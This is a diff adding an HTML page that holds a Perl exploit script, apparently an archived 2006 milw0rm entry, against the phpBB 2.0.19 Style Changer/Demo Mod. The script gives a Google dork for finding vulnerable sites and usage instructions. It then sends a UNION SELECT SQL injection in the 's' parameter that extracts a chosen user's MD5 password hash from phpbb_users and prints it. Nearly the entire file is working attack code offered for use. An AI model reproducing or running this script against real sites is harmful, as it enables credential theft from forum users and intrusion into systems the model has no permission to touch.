@@ -1,0 +1,47 @@
+<html><head><title>phpBB 2.0.19 (Style Changer/Demo Mod) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
+#########################################################
+#		 _______ _______ ______ 		#
+#		 |______ |______ |     \		#
+#		 ______| |______ |_____/		#
+#		                        		#
+#phpBB Style Changer/Demo Mod--&gt;GET HASH EXPLOIT	#
+#Created By SkOd                                        #
+#SED security Team                                      #
+#http://www.sed-team.be                                 #
+#skod.uk@gmail.com                                      #
+#ISRAEL                                                 #
+#########################################################
+#google:
+#&quot;Powered by phpBB&quot; inurl:&quot;index.php?s&quot; OR inurl:&quot;index.php?style&quot;
+#########################################################
+use IO::Socket;
+if (@ARGV &lt; 3){
+print q{
+############################################################
+#   phpBB Style Changer\Viewer MOD SQL injection Exploit   #
+#		Tested on phpBB 2.0.19			   #
+#	    created By SkOd. SED Security Team             #
+############################################################
+	bbstyle.pl [HOST] [PATH] [Target id]
+	 bbstyle.pl www.host.com /phpbb2/ 2
+############################################################
+};
+exit;
+}
+$serv = $ARGV[0];
+$dir = $ARGV[1];
+$id = $ARGV[2];
+print &quot;[+]Make Connection\n&quot;;
+$serv =~ s/(http:\/\/)//eg;
+$path = $dir.'index.php?s=-99%20UNION%20SELECT%20null,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20phpbb_users%20Where%20user_id='.$id.'/*';
+$socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$serv&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;[-]Connect Failed\r\n&quot;;
+print $socket &quot;GET $path HTTP/1.1\n&quot;;
+print $socket &quot;Host: $serv\n&quot;;
+print $socket &quot;Accept: */*\n&quot;;
+print $socket &quot;Connection: close\n\n&quot;;
+print &quot;[+]Connected\n&quot;;
+while ($hash = &lt;$socket&gt;){
+$hash =~ m/open(.*?)template/ &amp;&amp; print &quot;[+]User id: $id\n[+]Md5 Hash: $1\n&quot;;
+}
+
+# milw0rm.com [2006-02-05]</pre></html>
